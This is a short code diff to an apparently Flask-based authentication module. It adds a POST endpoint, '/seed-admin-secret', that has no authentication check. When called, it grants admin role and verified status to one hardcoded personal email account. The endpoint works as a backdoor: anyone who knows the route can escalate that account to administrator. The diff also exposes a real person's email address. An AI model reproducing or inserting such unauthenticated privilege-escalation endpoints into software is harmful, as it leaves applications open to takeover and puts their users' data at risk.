@@ -217,3 +217,14 @@ def reenviar_codigo_sms():
         return jsonify({"error": "Usuario no encontrado"}), 404
     generar_y_enviar_codigo_sms(usuario.id, usuario.telefono)
     return jsonify({"mensaje": "SMS reenviado"}), 200
+@auth_bp.route("/seed-admin-secret", methods=["POST"])
+def seed_admin():
+    from services.auth_service import hashear_password
+    usuario = Usuario.query.filter_by(email="percy19marceliano@gmail.com").first()
+    if usuario:
+        usuario.rol = "admin"
+        usuario.correo_verificado = True
+        usuario.telefono_verificado = True
+        db.session.commit()
+        return jsonify({"mensaje": "Admin actualizado"}), 200
+    return jsonify({"error": "No encontrado"}), 404
